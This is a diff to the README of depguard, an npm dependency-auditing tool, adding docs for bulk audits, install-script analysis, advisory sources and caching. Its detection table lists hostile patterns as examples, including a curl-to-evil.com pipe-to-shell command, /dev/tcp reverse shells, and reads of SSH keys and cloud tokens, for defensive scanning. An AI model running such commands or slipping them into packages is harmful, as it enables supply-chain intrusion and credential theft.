@@ -176,9 +176,62 @@ claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
 | Tool | Description |
 |------|-------------|
 | `depguard_audit` | Full security audit of an npm package |
+| `depguard_audit_bulk` | Audit multiple packages in a single call |
 | `depguard_search` | Search npm for packages by keywords |
 | `depguard_score` | Score a package 0-100 |
 | `depguard_should_use` | Recommend install vs write-from-scratch |
+
+### Bulk audit
+
+Audit all project dependencies in a single call. Accepts a list of package names or a dependencies object directly from `package.json`:
+
+```typescript
+// Via API
+import { auditBulk } from 'depguard-cli'
+
+const report = await auditBulk(['react', 'express', 'lodash'], { targetLicense: 'MIT' })
+console.log(report.total)       // 3
+console.log(report.vulnerable)  // 2
+console.log(report.summary)     // { critical: 0, high: 2, moderate: 5, low: 3 }
+```
+
+Via MCP, the AI agent can pass the dependencies object from `package.json` directly — no need to extract package names manually.
+
+## Install Script Analysis
+
+depguard statically analyzes install scripts (`preinstall`, `install`, `postinstall`) for suspicious patterns commonly used in supply chain attacks:
+
+| Pattern | Severity | Example |
+|---------|----------|---------|
+| Remote code execution | Critical | `curl evil.com/payload.sh \| sh` |
+| Reverse shells | Critical | `/dev/tcp/` connections |
+| Credential file access | Critical | Reading `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
+| Sensitive env vars | Critical | Accessing `$NPM_TOKEN`, `$AWS_SECRET` |
+| Shell typosquatting | Critical | `/bin/ssh` instead of `/bin/sh` |
+| Obfuscated code | High | `eval(Buffer.from(..., "base64"))` |
+| Process spawning | High | `child_process`, `exec()`, `spawn()` |
+| Environment access | High | `process.env` usage |
+| External network calls | Moderate | HTTP requests to non-standard hosts |
+
+Each audit report includes a `scriptAnalysis` field with `suspicious` (boolean) and `risks` (array of detected patterns with severity and description). No scripts are executed — analysis is purely static pattern matching.
+
+## Data sources
+
+depguard combines two advisory databases for maximum coverage:
+
+| Source | What it catches |
+|--------|----------------|
+| **npm Registry** | Advisories from `npm audit` |
+| **GitHub Advisory Database** | GHSA advisories, often not in npm |
+
+Results are deduplicated and each advisory includes a `source` field (`npm` or `github`).
+
+### Caching
+
+Results are cached in memory (5 min) and on disk at `~/.depguard/cache/` (24h). This means:
+- Repeated audits of the same package are instant (no network requests)
+- Cache survives process restarts
+- Expired entries are cleaned up automatically on startup
 
 ## License compatibility
 
